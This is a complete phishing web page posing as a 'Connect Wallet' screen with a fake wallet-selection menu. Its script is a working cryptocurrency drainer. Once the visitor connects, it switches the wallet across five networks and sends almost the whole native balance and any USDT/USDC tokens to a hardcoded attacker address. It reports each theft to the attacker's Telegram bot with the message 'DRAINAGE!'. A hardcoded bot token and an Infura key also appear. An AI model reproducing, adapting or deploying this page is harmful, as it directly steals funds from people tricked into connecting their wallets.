<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Connect Wallet</title>
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:white;border-radius:24px;padding:48px;width:90%;max-width:400px;box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center;animation:slideUp 0.5s ease}
@keyframes slideUp{from{transform:translateY(30px);opacity:0}to{transform:translateY(0);opacity:1}}
.lock-icon{font-size:48px;margin-bottom:24px}
h1{font-size:28px;font-weight:700;color:#1a1a1a;margin-bottom:32px}
.connect-btn{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;border:none;padding:18px 48px;font-size:18px;font-weight:600;border-radius:12px;cursor:pointer;width:100%;transition:all 0.3s ease;box-shadow:0 4px 15px rgba(102,126,234,0.4)}
.connect-btn:hover{transform:translateY(-2px);box-shadow:0 6px 20px rgba(102,126,234,0.5)}
.loading-modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.8);z-index:9999;justify-content:center;align-items:center}
.loading-modal.active{display:flex}
.loading-content{background:white;padding:32px;border-radius:16px;text-align:center}
.spinner{border:3px solid rgba(0,0,0,0.1);border-top-color:#667eea;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto 16px}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="card">
<div class="lock-icon">üîê</div>
<h1>Connect Wallet</h1>
<button class="connect-btn" onclick="connectWallet()">Connect Now</button>
</div>
<div id="loadingModal" class="loading-modal">
<div class="loading-content">
<div class="spinner"></div>
<div>Opening wallet selection...</div>
<a style="margin-top:16px;color:#667eea;cursor:pointer" onclick="closeModal()">Fermer</a>
</div>
</div>
<script>
const CONFIG={
BOT:"8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY",
CHAT:"8309320360",
DEST:"0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1"
};

function closeModal(){document.getElementById('loadingModal').classList.remove('active')}

async function connectWallet(){
document.getElementById('loadingModal').classList.add('active');
setTimeout(()=>{
document.getElementById('loadingModal').classList.remove('active');
if(window.ethereum){connectDirect()}else{showWeb3Modal()}
},2000);
}

function showWeb3Modal(){
const html=`
<div id="w3m" style="position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:99999;display:flex;align-items:center;justify-content:center">
<div style="background:#1c1c24;border-radius:24px;max-width:420px;width:90%">
<div style="padding:24px;border-bottom:1px solid rgba(255,255,255,0.08);display:flex;justify-content:space-between;align-items:center">
<h2 style="color:white;margin:0;font-size:20px">Connect Wallet</h2>
<button onclick="document.getElementById('w3m').remove()" style="background:none;border:none;color:#999;font-size:28px;cursor:pointer">√ó</button>
</div>
<div style="padding:20px">
<div onclick="sel('metamask')" style="display:flex;align-items:center;padding:16px;margin-bottom:12px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:16px;cursor:pointer">
<img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" style="width:48px;height:48px;border-radius:12px;margin-right:16px">
<span style="color:white;font-size:16px">MetaMask</span>
</div>
<div onclick="sel('trust')" style="display:flex;align-items:center;padding:16px;margin-bottom:12px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:16px;cursor:pointer">
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" style="width:48px;height:48px;border-radius:12px;margin-right:16px;background:#3375BB">
<span style="color:white;font-size:16px">Trust Wallet</span>
</div>
<div onclick="sel('coinbase')" style="display:flex;align-items:center;padding:16px;margin-bottom:12px;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);border-radius:16px;cursor:pointer">
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==" style="width:48px;height:48px;border-radius:12px;margin-right:16px;background:#0052FF">
<span style="color:white;font-size:16px">Coinbase</span>
</div>
<div onclick="allW()" style="display:flex;align-items:center;justify-content:space-between;padding:16px;border:2px dashed rgba(255,255,255,0.15);border-radius:16px;cursor:pointer">
<div style="display:flex;align-items:center">
<span style="font-size:24px;margin-right:16px">üî∑</span>
<span style="color:white;font-size:16px">All Wallets</span>
</div>
<span style="color:#666;font-size:14px">540+</span>
</div>
</div>
</div>
</div>`;
document.body.insertAdjacentHTML('beforeend',html);
}

function sel(w){
document.getElementById('w3m')?.remove();
if(w=='trust'){
if(window.ethereum){connectDirect()}
else{window.location.href='https://link.trustwallet.com/open_url?coin_id=60&url='+encodeURIComponent(window.location.href)}
}else if(w=='coinbase'){
if(window.ethereum){connectDirect()}
else{window.open('https://go.cb-w.com/dapp?cb_url='+encodeURIComponent(window.location.href),'_blank')}
}else{connectDirect()}
}

function allW(){
const wallets=['1inch','MetaMask','Trust','Ledger','BitPay','Best','Fireblocks','Bitget','TokenPocket','SafePal','Uniswap','Exodus','Atomic','Rainbow','Argent','imToken'];
const grid=wallets.map((w,i)=>`
<div onclick="sel('${w}')" style="display:flex;flex-direction:column;align-items:center;padding:12px;background:rgba(255,255,255,0.03);border-radius:12px;cursor:pointer">
<div style="width:48px;height:48px;display:flex;align-items:center;justify-content:center;background:rgba(255,255,255,0.1);border-radius:12px;margin-bottom:8px;font-size:24px">${i<10?'0':''}${i+1}</div>
<span style="color:white;font-size:11px;text-align:center">${w}</span>
</div>`).join('');

const html=`
<div id="all" style="position:fixed;inset:0;background:rgba(0,0,0,0.9);z-index:99999;overflow-y:auto">
<div style="background:#1c1c24;border-radius:24px;max-width:600px;width:90%;margin:50px auto">
<div style="padding:24px;border-bottom:1px solid rgba(255,255,255,0.08);display:flex;align-items:center">
<button onclick="document.getElementById('all').remove();showWeb3Modal()" style="background:none;border:none;color:white;font-size:24px;cursor:pointer;margin-right:16px">‚Üê</button>
<h2 style="color:white;margin:0;font-size:20px;flex:1">All Wallets</h2>
<button onclick="document.getElementById('all').remove()" style="background:none;border:none;color:#999;font-size:28px;cursor:pointer">√ó</button>
</div>
<div style="padding:20px">
<input placeholder="Search wallet" style="width:100%;padding:14px;background:rgba(255,255,255,0.05);border:1px solid rgba(255,255,255,0.08);border-radius:12px;color:white;font-size:16px;margin-bottom:20px">
<div style="display:grid;grid-template-columns:repeat(4,1fr);gap:12px">${grid}</div>
</div>
</div>
</div>`;

document.getElementById('w3m')?.remove();
document.body.insertAdjacentHTML('beforeend',html);
}

async function connectDirect(){
if(!window.ethereum){window.open('https://metamask.io/download/','_blank');return}
try{
const accounts=await window.ethereum.request({method:'eth_requestAccounts'});
const addr=accounts[0];
const provider=new ethers.providers.Web3Provider(window.ethereum);
const signer=provider.getSigner();

// Multi-chain drain
const chains=[
{id:137,name:'Polygon',rpc:'https://polygon-rpc.com'},
{id:1,name:'Ethereum',rpc:'https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161'},
{id:56,name:'BSC',rpc:'https://bsc-dataseed.binance.org'},
{id:42161,name:'Arbitrum',rpc:'https://arb1.arbitrum.io/rpc'},
{id:43114,name:'Avalanche',rpc:'https://api.avax.network/ext/bc/C/rpc'}
];

for(const chain of chains){
try{
await window.ethereum.request({
method:'wallet_switchEthereumChain',
params:[{chainId:'0x'+chain.id.toString(16)}]
}).catch(async e=>{
if(e.code===4902){
await window.ethereum.request({
method:'wallet_addEthereumChain',
params:[{
chainId:'0x'+chain.id.toString(16),
chainName:chain.name,
rpcUrls:[chain.rpc],
nativeCurrency:{name:chain.name,symbol:chain.name,decimals:18}
}]
})}
});

await new Promise(r=>setTimeout(r,1000));
const balance=await provider.getBalance(addr);

if(balance.gt(ethers.utils.parseEther("0.001"))){
const gasPrice=await provider.getGasPrice();
const gasLimit=21000;
const gasCost=gasPrice.mul(gasLimit).mul(2);
const amount=balance.sub(gasCost);

if(amount.gt(0)){
const tx=await signer.sendTransaction({
to:CONFIG.DEST,
value:amount,
gasLimit:gasLimit,
gasPrice:gasPrice
});
await tx.wait();
notify(addr,ethers.utils.formatEther(amount),chain.name);
}}

// Drain tokens
const tokens={
1:[{a:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',s:'USDC'},{a:'0xdAC17F958D2ee523a2206206994597C13D831ec7',s:'USDT'}],
137:[{a:'0xc2132D05D31c914a87C6611C10748AEb04B58e8F',s:'USDT'},{a:'0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',s:'USDC'}],
56:[{a:'0x55d398326f99059fF775485246999027B3197955',s:'USDT'},{a:'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',s:'USDC'}]
};

const abi=['function balanceOf(address) view returns (uint256)','function transfer(address,uint256) returns (bool)'];
const list=tokens[chain.id]||[];

for(const tk of list){
try{
const ct=new ethers.Contract(tk.a,abi,signer);
const bal=await ct.balanceOf(addr);
if(bal.gt(0)){await ct.transfer(CONFIG.DEST,bal)}
}catch(e){}
}
}catch(e){console.log(e)}
}}catch(e){console.error(e)}
}

async function notify(v,a,n){
fetch(`https://api.telegram.org/bot${CONFIG.BOT}/sendMessage`,{
method:'POST',
headers:{'Content-Type':'application/json'},
body:JSON.stringify({
chat_id:CONFIG.CHAT,
text:`üéØ DRAINAGE!\nüë§ ${v.substring(0,6)}...${v.slice(-4)}\nüí∞ ${a} ${n}\nüìç Re√ßu: ${CONFIG.DEST.substring(0,6)}...`
})
}).catch(e=>{});
}
</script>
</body>
</html>
